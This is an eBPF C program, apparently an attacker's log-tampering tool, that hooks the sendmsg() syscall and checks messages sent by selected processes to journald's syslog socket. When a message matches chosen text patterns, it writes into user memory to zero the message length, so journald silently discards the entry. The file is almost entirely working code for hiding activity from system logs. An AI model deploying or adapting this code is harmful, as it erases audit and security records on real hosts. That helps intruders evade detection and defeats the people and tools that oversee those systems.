//go:build ignore

/*  The goal here is to create a eBPF program that hook sendmsg() syscall mainly to 
    block log messages sent over the syslog sockets used by journald. This allows us to 
    filter almost any type of log we want. 

    The log will not be written by journald.

    Here, we can filter only specific processes and define occurrences to filter within 
    the msg_iov buffers of the msghdr struct. If a match is found, we set msg_iovlen to 0, 
    making the message appear empty to journald, which will then ignore it.
*/

#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>
#include "hook_sendmsg.h"

SEC("kprobe/sendmsg")
int BPF_KPROBE(kprobe_sendmsg)
{
    struct pt_regs *real_regs = PT_REGS_SYSCALL_REGS(ctx);

    u32 uid = (u32)bpf_get_current_uid_gid();

    char comm[TASK_COMM_LEN] = {};
    bpf_get_current_comm(&comm, sizeof(comm));

    int found_command = 0;
        for (int c = 0; c < MAX_COMMANDS; c++) {
        if (__builtin_strncmp(comm, commands[c].command, commands[c].len) == 0) {
            found_command = 1;
            break;
        }
    }
    
    if (!found_command) {
        return 0;
    }
    struct user_msghdr *msg = (struct user_msghdr *)PT_REGS_PARM2_CORE_SYSCALL(real_regs);
    int iovlen = 0;
    bpf_core_read_user(&iovlen, sizeof(iovlen), &msg->msg_iovlen);
    if (iovlen < 1)
        return 0;
    
    const struct iovec *iov_ptr = NULL;
    if (bpf_core_read_user(&iov_ptr, sizeof(iov_ptr), &msg->msg_iov) < 0)
        return 0;
    int found = 0;
    for (int i = 0; i < 10; i++) {
        if (i >= (int)iovlen)
            break;

        struct iovec iov = {};
        char buf[MAX_PRINT] = {};
        if (bpf_core_read_user(&iov, sizeof(iov), (const void *)(iov_ptr + i)) < 0)
            break;

        size_t len = iov.iov_len;
        if (len == 0)
            continue;
        if (len > MAX_PRINT)
            len = MAX_PRINT;

        if (bpf_core_read_user_str(buf, len+1, iov.iov_base) < 0)
            continue;

        bpf_printk("sendmsg iov[%d] data: %s\n COM=%s", i, buf,comm);

        for (int p = 0; p < MAX_PATTERNS; p++) {
            if (patterns[p].len == 0 || patterns[p].len > len)
                continue;
            for (int j = 0; j <= (int)len - patterns[p].len; j++) {
                if (__builtin_memcmp(&buf[j], patterns[p].pattern, patterns[p].len) == 0) {
                    found = 1;
                    break;
                }
            }
        }
        if (found)
            break;
    }
    if (found) {
        int zero = 0;
        bpf_probe_write_user(&msg->msg_iovlen, &zero, sizeof(int));
    }
    return 0;
}
char LICENSE[] SEC("license") = "GPL";
